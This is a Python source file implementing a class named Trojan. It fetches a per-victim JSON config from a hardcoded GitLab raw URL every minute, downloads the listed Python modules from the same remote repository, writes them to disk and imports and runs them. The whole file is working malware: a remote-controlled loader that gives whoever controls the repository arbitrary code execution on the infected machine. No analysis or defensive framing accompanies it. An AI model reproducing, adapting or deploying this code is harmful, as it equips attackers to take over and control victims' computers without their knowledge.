import requests, json
import threading, time, os
import importlib.machinery

class Trojan:
    def __init__(self, configUrl, modulesRepo):
        self.__stop = False
        self.__config_url = configUrl
        self.__update_config()
        self.__update_thread = threading.Thread(target=self.__conf_update_loop)
        self.__loaded_modules =[]
        self.__loader = ModuleLoader(modulesRepo)
        self.__modules_repo = modulesRepo

    def start(self):
        self.__update_thread.start()
        while True:
            for mod in self.__conf["modules"]:
                a = self.__loader.load_module(mod["name"])
                if a != None:
                    a.run()
            time.sleep(60)


    def __conf_update_loop(self):
        while not self.__stop:
            try:
                self.__update_config()
            except:
                pass
            time.sleep(60)

    def __update_config(self):
        resp = requests.get(self.__config_url)
        self.__conf = json.loads(resp.content.decode('utf-8'))
        pass


class ModuleLoader:
    def __init__(self, modulesRepo):
        self.__modules_repo = modulesRepo

    def load_module(self, mod_name):
        mod_path ='modules/' + mod_name + '.py'
        try:
            resp = requests.get(self.__modules_repo + mod_name + '.py')
            if not os.path.isdir('./modules'):
                os.mkdir('./modules')
            if os.path.isfile(mod_path):
                os.remove(mod_path)
            with open(mod_path, 'w') as f:
                f.write(resp.content.decode('utf-8'))
        except Exception as e:
            print(e)
            return None
        return importlib.machinery.SourceFileLoader(mod_name, mod_path).load_module()


def main():
    id = 'b494b07e-5e27-4073-8db2-f550d60308e4'
    configRepo = 'https://gitlab.com/threetoes/config-repo/raw/master/config/' + id + '.json'
    modulesRepo = 'https://gitlab.com/threetoes/config-repo/raw/master/modules/'
    t = Trojan(configRepo, modulesRepo)
    t.start()


if __name__ == '__main__':
    main()